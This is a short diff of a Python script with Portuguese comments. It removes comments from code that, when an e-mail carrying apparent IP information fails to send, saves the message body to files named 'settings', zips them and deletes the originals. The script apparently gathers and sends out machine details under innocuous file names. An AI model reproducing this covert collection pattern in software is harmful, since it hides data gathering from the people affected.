@@ -93,20 +93,16 @@ Informações de IP:
                 with open(f"settings{num_txt}.txt", "a") as arquivo:
                     arquivo.write(f"Erro ao enviar e-mail:\n{corpo_email}\n")
 
-            # Verifica se o arquivo .txt existe antes de criar o ZIP
             if os.path.exists(f"settings{num_txt}.txt"):
                 num_zip = 1
                 num_txt = 1
 
-                # Verifica se o arquivo zip com o mesmo número já existe
                 while os.path.exists(f"settings{num_zip}.zip"):
                     num_zip += 1
 
-                # Cria o arquivo zip com o número
                 with zipfile.ZipFile(f"settings{num_zip}.zip", "w", zipfile.ZIP_DEFLATED) as zipf:
                     zipf.write(f"settings{num_txt}.txt")  # Grava o arquivo .txt correspondente ao número do .zip
 
-                # Exclui o arquivo .txt após a criação do ZIP
                 os.remove(f"settings{num_txt}.txt")
 
                 exit(0)
